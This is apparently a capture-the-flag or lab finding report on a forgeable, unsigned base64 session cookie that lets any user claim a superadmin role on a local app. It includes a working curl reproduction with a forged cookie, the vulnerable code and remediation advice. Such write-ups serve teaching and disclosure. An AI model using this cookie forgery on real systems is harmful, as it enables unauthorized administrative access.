# Finding 4 — Broken Authorization (forgeable session / privilege escalation)

- **Class:** Broken Access Control / insecure session token (CWE-284, CWE-807,
  CWE-565) — OWASP A01:2021
- **Endpoint:** `GET /vault` (gated on `role == superadmin`)
- **Severity:** Critical — any user can mint an arbitrary role and reach
  admin-only functionality.
- **Flag:** `FLAG{authz_9e92b94b4dde}`

## Request (reproducible)
```bash
# the auth cookie is just base64("username:role"), unsigned
FORGED=$(printf '%s' "hacker:superadmin" | base64)   # aGFja2VyOnN1cGVyYWRtaW4=
curl -s -i --cookie "auth=$FORGED" http://127.0.0.1:5000/vault
```

## Result (actual)
- Normal session (`alice`, role=user): `GET /vault` -> `403 FORBIDDEN`,
  `403 — superadmins only.`
- Forged cookie `auth=aGFja2VyOnN1cGVyYWRtaW4=` (decodes to `hacker:superadmin`):
  `GET /vault` -> `200 OK`, `Access granted, superadmin.` `FLAG{authz_9e92b94b4dde}`

## Why it works
The session cookie is created and parsed with no integrity protection
(app.py:182-195):
```python
token = base64.b64encode(("%s:%s" % (username, role)).encode())  # set_auth
username, role = base64.b64decode(token).decode().split(":", 1)  # current_user
```
Base64 is encoding, not signing or encryption, so a client can edit the role
field freely. `/vault` trusts that client-supplied role (app.py:314). No login
path ever grants `superadmin`, but the attacker simply asserts it.

## Remediation
- Use a **signed/encrypted session** (Flask's `itsdangerous`-backed
  `session`, or JWT with a verified server-side signature). Reject tampered
  tokens.
- Store only an opaque session id client-side; keep role/identity **server-side**
  and look it up per request — never trust a role from the client.
- Enforce authorization from the server's record of the user, and default-deny.
